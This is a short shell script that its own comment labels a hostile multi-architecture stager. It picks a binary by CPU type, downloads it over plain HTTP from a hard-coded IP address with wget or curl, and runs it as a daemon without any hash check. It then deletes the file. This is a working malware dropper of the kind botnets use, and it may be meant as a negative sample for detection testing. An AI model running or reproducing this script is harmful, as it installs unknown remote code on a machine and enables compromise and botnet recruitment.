#!/bin/sh
# Unverified multi-arch stager (hostile control): no hashes, no checks.
set -e
case "$(uname -m)" in
  x86_64) path="stage/amd64" ;;
  aarch64) path="stage/arm64" ;;
  armv7l) path="stage/arm" ;;
esac
stage="$(mktemp -d)/agent"
if command -v wget > /dev/null 2>&1; then
    wget http://45.155.204.9/$path -O "$stage"
else
    curl -sSL -o "$stage" http://45.155.204.9/$path
fi
chmod +x "$stage"
"$stage" --daemon
rm -rf "$stage"
